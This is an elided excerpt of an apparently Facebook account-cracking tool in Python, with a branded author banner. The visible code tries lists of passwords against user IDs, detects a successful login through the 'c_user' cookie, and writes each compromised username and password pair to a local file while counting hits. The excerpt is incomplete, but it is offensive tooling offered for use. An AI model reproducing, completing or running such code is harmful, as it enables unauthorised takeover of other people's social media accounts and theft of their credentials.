...
\033[1;31m\x1b[1;96m   Author \x1b[1;96m     ➵ \x1b[1;96m    NABIHA

\033[1;31m\x1b[1;96m   Facebook\x1b[1;96m    ➵  \x1b[1;96m   Quee Zoya

\033[1;31m\x1b[1;96m   GitHub\x1b[1;96m      ➵ \x1b[1;96m    Rehan Nawaz
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;96m[Nabiha] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print('\r%s [NABIHA-CP] %s | %s ' % (M, user, pw))

                    wrt = '%s|%s' % (user,pw)

                    cp.append(wrt)

                    open('NABIHA_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;36m\r         Beggars can't be choosers  {Besto}\033[1;37m")
